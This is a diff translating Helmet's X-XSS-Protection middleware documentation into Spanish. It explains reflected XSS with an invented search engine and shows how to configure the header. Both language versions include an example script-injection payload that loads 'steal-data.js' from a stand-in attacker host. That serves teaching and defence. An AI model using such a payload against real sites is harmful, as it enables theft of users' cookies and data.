@@ -3,93 +3,92 @@ layout: page
 title: XSS Filter
 permalink: /docs/xss-filter/
 ---
-In short: the `xssFilter` middleware sets the `X-XSS-Protection` header to prevent reflected XSS attacks.
+Brevemente: la función middleware `xssFilter` setea la cabecera `X-XSS-Protection` para prevenir los ataques XSS reflejados.
 
-The attack
+El ataque
 ----------
 
-Cross-site scripting, abbreviated to "XSS", is a way attackers can take over webpages. The goal of an XSS attack is to gain control of JavaScript in the victim's browser. Once a hacker has done that, there's a lot of nasty stuff they can do: log your actions, impersonate you, steal your authentication cookies, and much more.
+Los ataques de scripting de sitio-cruzado, abreviado "XSS" como un acrónimo en inglés, es una manera en la que los atacantes pueden hacerse con una página web. El objetivo de un ataque XSS es ganar control sobre la ejecución del Javascript en el navegador de la víctima. Una vez que un hacker ha logrado eso, hay un montón de cosas sucias que puede llevar a cabo: registrar todas las acciones de un usuario, impostar identidades, robar las *cookies* de autenticación, y mucho más.
 
-XSS is a multifaceted beast and we won't learn everything about it here. The main takeaway: if someone can run JavaScript on your page, they can attack your users and do a lot of bad things. We want to prevent it!
+El Xss es una bestia multifacética y el aprendizaje exhaustivo acerca del mismo es algo que excede ésta sección. Lo que sí podemos garantizar es lo siguiente: si alguien logra correr Javascript en tu sitio, entonces también pueden atacar a tus usuarios y llevar a cabo montones de acciones maliciosas. ¡Debemos prevenirlo!
 
-One kind of XSS is called "Reflected XSS". Typically, it works by setting a query string which is put directly into the HTML. Putting JavaScript in the query string can let an attacker execute their JavaScript just by giving someone a malicious query string.
+Una de las variedades de ataques XSS es llamado "XSS Reflejado". Típicamente funciona seteando una *query string* que es puesta directamente dentro del código HTML. De ésta manera, el atacante podría inyectar por medio de aquella *query string* y así lograr ejecutar código en el navegador de los usuarios que estén utilizando dicho HTML.
 
-For example, let's say you run a search engine called Goober. Every time you do a search, it displays your search terms right above your results. For example, let's say we've searched for "javascript jokes".
+Por ejemplo, supongamos que provees un servicio de motor de búsqueda llamado *Goober*. Cada vez que alguien hace una búsqueda éste muestra la búsqueda justo encima de los resultados. por ejemplo, digamos que hemos buscado *javascript jokes*.
 
-When you do a search, your search terms also appear in your query string. The full URL might look something like this:
+Cuando realizamos esa búsqueda, los términos de la misma también apareceran en la *query string*. La URL podría verse algo así:
 
 ```
 https://goober.example.com/search?query=javascript+jokes
 ```
 
-The search results might look like the screenshot below. Notice how the text appears right on the page:
+Los resultados de la búsqueda podrían verse similares a la captura de pantalla de aquí abajo. Nota como el texto aparece en la página.
 
 ![Screenshot of normal Goober search](xss-filter-ok.png)
 
-What if we could search for something like `<script src="http://evil.example.com/steal-data.js"></script>`? That URL would look like this:
+¿Qué pasaria si alguien buscara algo como `<script src="http://evil.example.com/steal-data.js"></script>`? Eso nos generaría una URL que se vería algo como:
 
 ```
 https://goober.example.com/search?query=<script%20src="http://evil.example.com/steal-data.js"></script>
 ```
 
-And here's how it would appear on your page:
+Y aquí puedes ver también cómo se vería en tu página:
 
 ![Screenshot of malicious Goober search](xss-filter-malicious.png)
 
-Suddenly, a malicious JavaScript file was executed just because you visited a URL! That's not good.
+¡Derepente, un archivo malicioso de Javascript ha sido ejecutado símplemente porque hemos visitado aquella URL! Eso sí que no es bueno.
 
-Read more:
+Leer más:
 
 - [Guide to understanding XSS](http://www.securesolutions.no/xss-explained/)
 - [Cross-site Scripting (XSS)](https://www.owasp.org/index.php/XSS)
 - [What is Reflected XSS?](http://security.stackexchange.com/q/65142)
 - [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
 
-The header
+La cabecera
 ----------
 
-To be very clear: *this header does not protect you from XSS attacks much*. It protects against a very particular kind of XSS, and other mitigation measures are far better. This header provides a quick win and basic protection, but this header does not save you from XSS attacks.
+Para ser muy claro: *ésta cabecera no te proteje demasiado contra los ataques XSS*. Sólo te proteje contra un tipo muy particular de ataques XSS, y sería muy recomendable incluir otras medidas de prevención. Ésta cabecera provee simplemente una protección básica y de ninguna manera ofrece una protección completa contra ataques XSS.
 
-It's relatively easy for browsers to detect simple reflected XSS. In the example above, browsers could choose not to execute the JavaScript inside a `<script>` tag if it matches what's in the query string. Some browsers do this detection by default, but some don't. To make these browsers check for this simple case, you can set the `X-XSS-Protection` header to `1; mode=block`.
+La detección de ataues simples de XSS Reflejado es algo relativamente sencillo para los navegadores actuales. En el ejemplo anterior, éstos podrían elegir no ejecutar ningún codigo de Javascript dentro de una *tag* `<script>` tag que pudiera encontrarse dentro de una *query string. Algunos navegadores hacen ésta detección por defecto, pero otros no. Sin embargo, para lograr protección contra éste caso específico puedes setear la cabecera `X-XSS-Protection` en `1; mode=block`.
 
-This tells browsers to detect and block reflected XSS.
+Esto informa a los navegadores que deben detectar y bloquear los ataques XSS Reflejados.
 
-This header causes some *even worse* security vulnerabilities in older versions of Internet Explorer, so it's wise to disable it there.
+Paradójicamente, ésta cabecera causa **incluso peores** problemas de seguridad en versiones antiguas de Internet Explorer, por lo que es bueno deshabilitarla en aquellos casos.
 
 - ["Controlling the XSS Filter" on MSDN](http://blogs.msdn.com/b/ieinternals/archive/2011/01/31/controlling-the-internet-explorer-xss-filter-with-the-x-xss-protection-http-header.aspx)
 - ["IE's XSS Filter Creates XSS Vulnerabilities"](http://hackademix.net/2009/11/21/ies-xss-filter-creates-xss-vulnerabilities/)
 - ["XSS Filter Script Handling Vulnerability - CVE-2009-4074"](https://technet.microsoft.com/library/security/ms10-002#XSS%20Filter%20Script%20Handling%20Vulnerability%20-%20CVE-2009-4074)
 
-The code
+El código
 --------
+El filtro `xssFilter` de Helmet es una función middleware relativamente sencilla que setea la cabecera `X-XSS-Protection`. En la mayoría de los navegadores le asignará el valor `1; mode=block`. Sin embargo, en las versiones antiguas e Internet Explorer le asignará `0` para inhabilitarla.
 
-Helmet's `xssFilter` is a relatively simple middleware that will set the `X-XSS-Protection` header. On most browsers, it will set it to `1; mode=block`. On old Internet Explorer versions, it will set it to `0` to disable it.
-
-You can use this module as part of Helmet:
+Puedes usar éste módulo como parte de Helmet:
 
 ```javascript
-// Make sure you run "npm install helmet" to get the Helmet package.
+// Aseúrate de haber ejecutado "npm install helmet" para obtener el paquete de Helmet.
 const helmet = require('helmet')
 
-// Sets "X-XSS-Protection: 1; mode=block".
+// Setea "X-XSS-Protection: 1; mode=block".
 app.use(helmet.xssFilter())
 ```
 
-You can also use it as a standalone module:
+También puedes usar el módulo en solitario:
 
 ```javascript
-// Make sure you run "npm install x-xss-protection" to get this package.
+// Asegúrate de haber ejecutado "npm install x-xss-protection" para obtener éste paquete.
 const xssFilter = require('x-xss-protection')
 
-// Sets "X-XSS-Protection: 1; mode=block".
+// Setea "X-XSS-Protection: 1; mode=block".
 app.use(xssFilter())
 ```
 
-To force the header to be set to `1; mode=block` on all versions of IE, add the option:
+Para forzar el valor `1; mode=block` en ésta cabecera en todas las versiones de Internet Explorer, puedes añadir la siguiente opción:
 
 ```javascript
 app.use(xssFilter({ setOnOldIE: true }))
-// This has some security problems for old IE!
+// Esto puede traerte problemas de seguridad en versiones antiguas de Internet explorer!!
 ```
 
 You can also optionally configure a report URI, though the flag is [specific to Chrome-based browsers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection). This option will report the violation to the specified URI:
@@ -98,10 +97,10 @@ You can also optionally configure a report URI, though the flag is [specific to 
 app.use(xssFilter({ reportUri: '/report-xss-violation' }))
 ```
 
-To remove `mode=block` from the header, which isn't recommended, set the `mode` option to `null`:
+Para quitar `mode=block` de la cabecera, lo cual no es recomendado, setea la opción `mode` a `null`:
 
 ```javascript
 app.use(xssFilter({ mode: null }))
 ```
 
-This header is included in the default Helmet bundle.
+Ésta cabecera está incluida por defecto en el paquete de Helmet.
